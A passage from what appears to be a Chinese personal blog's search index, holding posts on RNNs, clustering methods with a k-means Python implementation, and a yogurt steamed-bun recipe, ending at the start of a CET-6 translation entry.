是RNN网络</strong>，<strong>右边是RNN网络</strong>按<strong>时序展开的形式</strong>，为什么要按照时序展开？主要是<strong>RNN中 隐状态</strong>更新需要<strong>依赖上一次的隐状态信息</strong>，就是我们理解的记忆信息。</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221118093247.png" alt="image-20221118093247491"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221201205228.png" alt="image-20221201205228900"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20221118094431.png" alt="image-20221118094431385"></p><h2 id="6-RNN总结"><a href="#6-RNN总结" class="headerlink" title="6.RNN总结"></a>6.RNN总结</h2><p><strong>RNN虽然理论上可以很漂亮的解决序列数据的训练</strong>，但是<strong>有梯度消失时的问题</strong>，当<strong>序列很长的时候问题尤其严重</strong>。因此，上面的<strong>RNN模型一般不能直接用于应用领域</strong>。在语音识别，手写书别以及机器翻译等NLP领域实际应用比较广泛的是<strong>基于RNN模型的一个特例LSTM</strong>。</p><h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7.参考链接"></a>7.参考链接</h2><p><a href="https://www.bilibili.com/video/BV1z5411f7Bm/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【循环神经网络】5分钟搞懂RNN，3D动画深入浅出_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习:聚类方法</title>
      <link href="/2022/11/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E8%81%9A%E7%B1%BB%E6%96%B9%E6%B3%95/"/>
      <url>/2022/11/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E8%81%9A%E7%B1%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="聚类方法"><a href="#聚类方法" class="headerlink" title="聚类方法"></a>聚类方法</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>聚类就是对<code>大量未知标注的数据</code>集,按<code>数据的内在相似性</code>将数据集<code>划分为多个类别</code>,使<code>类别内的数据相似度较大</code>而<code>类别间的数据相似度较小</code>。由这个定义，我们便可以知道，数据集并没有目标值。因此<a href="https://so.csdn.net/so/search?q=%E8%81%9A%E7%B1%BB%E7%AE%97%E6%B3%95&spm=1001.2101.3001.7020">聚类算法</a>属于无监督算法</p><h2 id="1-距离"><a href="#1-距离" class="headerlink" title="1.距离"></a>1.距离</h2><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111145031262.png" alt="image-20221111145031262"></p><blockquote><p>矩阵表示意义</p></blockquote><p>矩阵第j列表示第j个样本，j=1,2,…….n</p><p>第i行表示第i个属性，i=1,2,……m</p><p>矩阵元素xij   表示第j个样本的第i个属性。</p><p>在聚类中，将样本集合看作是向量空间中点的集合，以该空间的距离表示样本之间的相似度。</p><h3 id="1闵可夫斯基距离"><a href="#1闵可夫斯基距离" class="headerlink" title="1闵可夫斯基距离"></a>1闵可夫斯基距离</h3><blockquote><ol><li>定义</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111145611428.png" alt="image-20221111145611428"></p><blockquote><ol start="2"><li>p=2：欧氏距离</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111145745057.png" alt="image-20221111145745057"></p><blockquote><ol start="3"><li>p=1： 曼哈顿距离</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111145758569.png" alt="image-20221111145758569"></p><blockquote><ol start="4"><li>p=00：切比雪夫距离</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111145818292.png" alt="image-20221111145818292"></p><p>简单理解：取各个坐标数值差的绝对值的最大值。</p><blockquote><ol start="2"><li>评价标准</li></ol></blockquote><p>距离越大 相似度越小，距离越小相似度越大。</p><h3 id="2-马氏距离"><a href="#2-马氏距离" class="headerlink" title="2 马氏距离"></a>2 马氏距离</h3><blockquote><ol><li>定义</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111150147065.png" alt="image-20221111150147065"></p><blockquote><ol start="2"><li>评价标准</li></ol></blockquote><p>距离越大相似度越小，距离越小相似度越大</p><h2 id="2-相关系数"><a href="#2-相关系数" class="headerlink" title="2.相关系数"></a>2.相关系数</h2><blockquote><ol><li>定义</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111150740068.png" alt="image-20221111150740068"></p><blockquote><ol start="2"><li>评价标准</li></ol></blockquote><p>相关系数绝对值越接近1，表示越相似，越接近0，表示样本越不相似</p><h2 id="3-夹角余玄"><a href="#3-夹角余玄" class="headerlink" title="3. 夹角余玄"></a>3. 夹角余玄</h2><blockquote><ol><li>定义</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111150929714.png" alt="image-20221111150929714"></p><blockquote><ol start="2"><li>评价标准</li></ol></blockquote><p>夹角的余玄越接近1，表示样本越相似 。越接近0，样本越不相似。</p><h2 id="4-例子"><a href="#4-例子" class="headerlink" title="4.例子"></a>4.例子</h2><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111151226295.png" alt="image-20221111151226295"></p><h2 id="5-类或簇"><a href="#5-类或簇" class="headerlink" title="5.类或簇"></a>5.类或簇</h2><h3 id="1-硬聚类"><a href="#1-硬聚类" class="headerlink" title="1.硬聚类"></a>1.硬聚类</h3><p>如果一个聚类方法假定一个样本只能属于一个类，或类的交集为空集：硬聚类</p><h3 id="2-软聚类"><a href="#2-软聚类" class="headerlink" title="2.软聚类"></a>2.软聚类</h3><p>如果一个样本可以属于多个类，或者类的交集不为空集：软聚类。</p><h3 id="3-定义"><a href="#3-定义" class="headerlink" title="3.定义"></a>3.定义</h3><blockquote><ol><li>预备知识</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111151918046.png" alt="image-20221111151918046"></p><blockquote><ol start="2"><li>定义1</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111152045731.png" alt="image-20221111152045731"></p><p>重点：最常用</p><blockquote><ol start="3"><li>定义2</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111152123590.png" alt="image-20221111152123590"></p><p>理解：以xi样本为圆心，以T为半径画个圆。则在圆为一个类。</p><blockquote><ol start="4"><li>定义3</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111152405006.png" alt="image-20221111152405006"></p><p>理解：求xi样本和G这个类除去（xi)中剩余nG-1个样本的平均距离。nG为G类的样本个数</p><blockquote><ol start="5"><li>定义4</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111152844492.png" alt="image-20221111152844492"></p><p>理解：从G类中任意取出2个样本：类似于排列</p><h3 id="4-特征"><a href="#4-特征" class="headerlink" title="4. 特征"></a>4. 特征</h3><blockquote><ol><li>类的中心</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111153105871.png" alt="image-20221111153105871"></p><p>理解：类G中所有样本相加求均值</p><blockquote><ol start="2"><li>类的直径</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111153508801.png" alt="image-20221111153508801"></p><h3 id="5-类与类之间的距离"><a href="#5-类与类之间的距离" class="headerlink" title="5.类与类之间的距离"></a>5.类与类之间的距离</h3><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111160322669.png" alt="image-20221111160322669"></p><blockquote><ol><li>最短距离</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111160342505.png" alt="image-20221111160342505"></p><p>在类p和类q中任意选择一个求最小值</p><blockquote><ol start="2"><li>最长距离</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111160426230.png" alt="image-20221111160426230"></p><blockquote><ol start="3"><li>中心距离</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111160524965.png" alt="image-20221111160524965"></p><blockquote><ol start="4"><li>平均距离</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111160630044.png" alt="image-20221111160630044"></p><h2 id="6-K均值聚类"><a href="#6-K均值聚类" class="headerlink" title="6.K均值聚类"></a>6.K均值聚类</h2><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>K均值聚类又叫做(<a href="https://so.csdn.net/so/search?q=k-means&spm=1001.2101.3001.7020">k-means</a>算法)是属于<code>无监督学习</code>里的一种最基础最常用聚类算法。所谓<code>聚类即人以类聚、物以群分</code>，将样本按照各自的特点分为不同的类别，所谓<code>无监督即事先不知道任何样本属于哪个类别</code>。</p><h3 id="2-策略"><a href="#2-策略" class="headerlink" title="2. 策略"></a>2. 策略</h3><p>k均值聚类归结为样本集合X的划分，或者从样本到类的函数的选择问题。k均值聚类的策略是通过损失函数的最小化选取最优划分。</p><p><code>欧式距离平方作为样本之间的距离作为评价标准</code></p><blockquote><ol><li>欧式距离平方</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111163246656.png" alt="image-20221111163246656"></p><blockquote><ol start="2"><li>损失函数：样本与其所属类的中心之间的距离的总和</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111165501540.png" alt="image-20221111165501540"></p><p>第一个求和符号是当前类。第二个求和符号是对多少个类进行。</p><blockquote><ol start="3"><li>最优化过程</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111165538527.png" alt="image-20221111165538527"></p><h3 id="3-算法"><a href="#3-算法" class="headerlink" title="3. 算法"></a>3. 算法</h3><blockquote><p>1.过程</p></blockquote><p>k均值聚类的算法是一个迭代的过程，每次迭代包括两个步骤：</p><ol><li>首先选择k个类的中心，将样本逐个指派到与其在最近的中心的类中，得到一个聚类过程</li><li>更新每个类的样本的均值，作为类的新的中心</li><li>重复1，2知道收敛为止</li></ol><blockquote><p>2.算法 步骤</p></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111170715974.png" alt="image-20221111170715974"></p><blockquote><ol start="3"><li>流程图</li></ol></blockquote><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy84d3ZwVEpHV0xaYll6MUhsTUV0YndvMlI4S1NQU3NpY2FPenFHZUJYMndnZ1JSRUpISWljNTg1aWNXUG44SnZMaWF5NDRFNlM3U3hVaWIxcENjUzBNQXhXTnJBLzY0MA?x-oss-process=image/format,png" alt="img"></p><h3 id="4-列子"><a href="#4-列子" class="headerlink" title="4.列子"></a>4.列子</h3><blockquote><ol><li>例子详情</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111170946101.png" alt="image-20221111170946101"></p><blockquote><ol start="2"><li>选取中心点</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111171728736.png" alt="image-20221111171728736"></p><blockquote><ol start="3"><li>计算划分最近类</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111171836367.png" alt="image-20221111171836367"></p><blockquote><ol start="4"><li>得到最新聚类中心</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111171924761.png" alt="image-20221111171924761"></p><blockquote><ol start="5"><li>重复3 和4</li></ol></blockquote><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111172359436.png" alt="image-20221111172359436"></p><h2 id="7-代码例子"><a href="#7-代码例子" class="headerlink" title="7. 代码例子"></a>7. 代码例子</h2><blockquote><ol><li>生成数据</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment" spellcheck="true"># 从sklearn中直接生成聚类数据</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>samples_generator <span class="token keyword">import</span> make_blobs</code></pre><blockquote><ol start="2"><li>画出图像</li></ol></blockquote><pre class=" language-python"><code class="language-python">x<span class="token punctuation">,</span> y <span class="token operator">=</span> make_blobs<span class="token punctuation">(</span> n_samples<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> centers<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> random_state<span class="token operator">=</span><span class="token number">1234</span><span class="token punctuation">,</span> cluster_std<span class="token operator">=</span><span class="token number">0.6</span> <span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token operator">=</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111174103438.png" alt="image-20221111174103438"></p><blockquote><ol start="3"><li>k均值算法</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 引入scipy中的距离函数，默认欧式距离</span><span class="token keyword">from</span> scipy<span class="token punctuation">.</span>spatial<span class="token punctuation">.</span>distance <span class="token keyword">import</span> cdist<span class="token keyword">class</span> <span class="token class-name">K_Means</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 初始化，参数 n_clusters（K）、迭代次数max_iter、初始质心 centroids</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n_clusters<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> max_iter<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">,</span> centroids<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>n_clusters <span class="token operator">=</span> n_clusters        self<span class="token punctuation">.</span>max_iter <span class="token operator">=</span> max_iter        self<span class="token punctuation">.</span>centroids <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span> centroids<span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>float <span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 训练模型方法，k-means聚类过程，传入原始数据</span>    <span class="token keyword">def</span> <span class="token function">fit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 假如没有指定初始质心，就随机选取data中的点作为初始质心</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> self<span class="token punctuation">.</span>centroids<span class="token punctuation">.</span>shape <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 从data中随机生成0到data行数的6个整数，作为索引值</span>            self<span class="token punctuation">.</span>centroids <span class="token operator">=</span> data<span class="token punctuation">[</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>n_clusters <span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token punctuation">:</span> <span class="token punctuation">]</span>                    <span class="token comment" spellcheck="true"># 开始迭代</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>self<span class="token punctuation">.</span>max_iter<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 1. 计算距离矩阵，得到的是一个100*6的矩阵</span>            distances <span class="token operator">=</span> cdist<span class="token punctuation">(</span>data<span class="token punctuation">,</span> self<span class="token punctuation">.</span>centroids<span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true"># 2. 对距离按有近到远排序，选取最近的质心点的类别，作为当前点的分类</span>            c_ind <span class="token operator">=</span> np<span class="token punctuation">.</span>argmin<span class="token punctuation">(</span> distances<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true"># 3. 对每一类数据进行均值计算，更新质心点坐标</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>self<span class="token punctuation">.</span>n_clusters<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># 排除掉没有出现在c_ind里的类别</span>                <span class="token keyword">if</span> i <span class="token keyword">in</span> c_ind<span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># 选出所有类别是i的点，取data里面坐标的均值，更新第i个质心</span>                    self<span class="token punctuation">.</span>centroids<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span> data<span class="token punctuation">[</span>c_ind<span class="token operator">==</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 实现预测方法</span>    <span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> samples<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 跟上面一样，先计算距离矩阵，然后选取距离最近的那个质心的类别</span>        distances <span class="token operator">=</span> cdist<span class="token punctuation">(</span>samples<span class="token punctuation">,</span> self<span class="token punctuation">.</span>centroids<span class="token punctuation">)</span>        c_ind <span class="token operator">=</span> np<span class="token punctuation">.</span>argmin<span class="token punctuation">(</span> distances<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">)</span>                <span class="token keyword">return</span> c_inddist <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">221</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">221</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c_ind <span class="token operator">=</span> np<span class="token punctuation">.</span>argmin<span class="token punctuation">(</span> dist<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">##该函数主要用来检索数组中最小值的位置，并返回其下标值。同理，argmax()函数就是用来检索最大值的下标，与argmin()函数用法相同</span><span class="token keyword">print</span><span class="token punctuation">(</span>c_ind<span class="token punctuation">)</span>x_new<span class="token operator">=</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_new<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c_ind<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_new<span class="token punctuation">[</span>c_ind<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>x_new<span class="token punctuation">[</span>c_ind<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><blockquote><ol start="4"><li>训练和预测</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义一个绘制子图函数</span><span class="token keyword">def</span> <span class="token function">plotKMeans</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> centroids<span class="token punctuation">,</span> subplot<span class="token punctuation">,</span> title<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 分配子图，121表示1行2列的子图中的第一个</span>    plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span>subplot<span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 画出质心点</span>    plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>centroids<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> centroids<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span>title<span class="token punctuation">)</span>kmeans <span class="token operator">=</span> K_Means<span class="token punctuation">(</span>max_iter<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">,</span> centroids<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plotKMeans<span class="token punctuation">(</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> kmeans<span class="token punctuation">.</span>centroids<span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token string">'Initial State'</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 开始聚类</span>kmeans<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x<span class="token punctuation">)</span>plotKMeans<span class="token punctuation">(</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> kmeans<span class="token punctuation">.</span>centroids<span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token string">'Final State'</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 预测新数据点的类别</span>x_new <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y_pred <span class="token operator">=</span> kmeans<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_new<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>kmeans<span class="token punctuation">.</span>centroids<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>y_pred<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x_new<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x_new<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">)</span></code></pre><p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20221111174826135.png" alt="image-20221111174826135"></p><h2 id="8-参考链接"><a href="#8-参考链接" class="headerlink" title="8.参考链接"></a>8.参考链接</h2><p><a href="https://blog.csdn.net/KujyouRuri/article/details/118229671">(19条消息) k均值聚类代码的实现_KujyouRuri的博客-CSDN博客_k均值聚类算法代码实现</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>酸奶馒头</title>
      <link href="/2022/11/08/%E9%85%B8%E5%A5%B6%E9%A6%92%E5%A4%B4/"/>
      <url>/2022/11/08/%E9%85%B8%E5%A5%B6%E9%A6%92%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="酸奶馒头"><a href="#酸奶馒头" class="headerlink" title="酸奶馒头"></a>酸奶馒头</h1><h2 id="食材"><a href="#食材" class="headerlink" title="食材"></a>食材</h2><ol><li>500克面粉、</li><li>250克酸奶、</li><li>20克炼乳、</li><li>2克盐、</li><li>5克酵母、</li><li>5克泡打粉、</li><li>糖30克、</li><li>蛋清＞25克、</li><li>食用油10克</li></ol><h2 id="制作过程"><a href="#制作过程" class="headerlink" title="制作过程"></a>制作过程</h2><blockquote><ol><li> 用筷子搅和酸奶、酵母、盐、泡打粉糖、炼乳、蛋清、面粉，到絮状 </li></ol></blockquote><p><img src="https://i0.hdslb.com/bfs/note/b38fb3380462c82b582e369ead0540fe811f9514.jpg" alt="img"></p><blockquote><ol start="2"><li> 往里油→揉面→醒面20分钟</li></ol></blockquote><blockquote><ol start="3"><li> 桌面上撒点粉，揉面，把面团分成每个42克的小剂子</li></ol></blockquote><blockquote><ol start="4"><li>揉面===》馒头</li></ol></blockquote><p><img src="https://i0.hdslb.com/bfs/note/bb1c6197052d454d38d280576cb06a073cb0eb0f.jpg" alt="img"></p><blockquote><ol start="5"><li>把馒头放入40℃器械里，醒发20分钟</li></ol></blockquote><blockquote><ol start="6"><li>蒸笼的屉布上洒点水，把馒头放入大火蒸15-20分钟，关火，捂1分钟左右再开盖</li></ol></blockquote><h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><p><a href="https://www.bilibili.com/video/BV1fG411E7P7/?spm_id_from=333.999.0.0&vd_source=5e8f069711510b3788382a0a03ff38e5">要想馒头做的好，标准配方少不了！国家级评委的小妙招~丨酸奶馒头_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 美食 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>六级翻译</title>
      <link href="/2022/11/07/%E5%85%AD%E7%BA%A7%E7%BF%BB%E8%AF%91/"/>
      <url>/2022/11/07/%E5%85%AD%E7%BA%A7%E7%BF%BB%E8%AF%91/</url>
      
